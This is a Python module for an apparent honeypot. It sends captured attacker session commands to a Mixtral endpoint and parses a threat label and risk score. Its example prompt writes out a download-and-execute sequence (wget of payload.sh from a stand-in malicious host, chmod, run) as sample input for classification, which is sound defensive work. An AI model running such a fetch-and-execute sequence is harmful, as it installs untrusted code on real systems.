"""
llm_inference.py
----------------
Handles outbound POST requests to GroqCloud's Mixtral endpoint and
parses risk‑scoring replies for the cognitive honeypot.

Environment variable expected:
    GROQCLOUD_API_KEY   →  Your private GroqCloud token
"""

import os
import requests
import json
from typing import Dict, Optional

# ---------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------
GROQ_API_KEY = os.getenv("GROQCLOUD_API_KEY")
if not GROQ_API_KEY:
    raise RuntimeError("GROQCLOUD_API_KEY environment variable not set")

GROQ_ENDPOINT = "https://api.groqcloud.com/v1/mixtral/inference"  # example path
TIMEOUT = 10  # seconds
HEADERS = {
    "Authorization": f"Bearer {GROQ_API_KEY}",
    "Content-Type": "application/json"
}

# ---------------------------------------------------------------------
# Core request/response logic
# ---------------------------------------------------------------------
def query_mixtral(prompt: str) -> Optional[Dict]:
    """
    Send prompt to Mixtral LLM and return parsed JSON with:
        { "threat": str, "risk_score": float, "action": str, "rationale": str }
    Returns None on failure or malformed response.
    """
    payload = {"prompt": prompt, "max_tokens": 256, "temperature": 0.0}

    try:
        resp = requests.post(GROQ_ENDPOINT, headers=HEADERS,
                             data=json.dumps(payload), timeout=TIMEOUT)
        resp.raise_for_status()
        data = resp.json()

        # Expected response shape (adjust if your endpoint differs)
        return {
            "threat": data.get("threat"),
            "risk_score": float(data.get("risk_score", 0)),
            "action": data.get("action"),
            "rationale": data.get("rationale", "")
        }
    except (requests.RequestException, ValueError, KeyError) as err:
        print(f"[!] Mixtral inference error: {err}")
        return None

# ---------------------------------------------------------------------
# Example standalone use
# ---------------------------------------------------------------------
if __name__ == "__main__":
    example_prompt = (
        "Session ID: s001\n"
        "Source IP: 192.168.1.50\n"
        "Commands:\n"
        "1. wget http://malicious.site/payload.sh\n"
        "2. chmod +x payload.sh\n"
        "3. ./payload.sh\n\n"
        "Is this behavior malicious? If yes, classify and assign risk."
    )

    result = query_mixtral(example_prompt)
    print("LLM Response →", result)
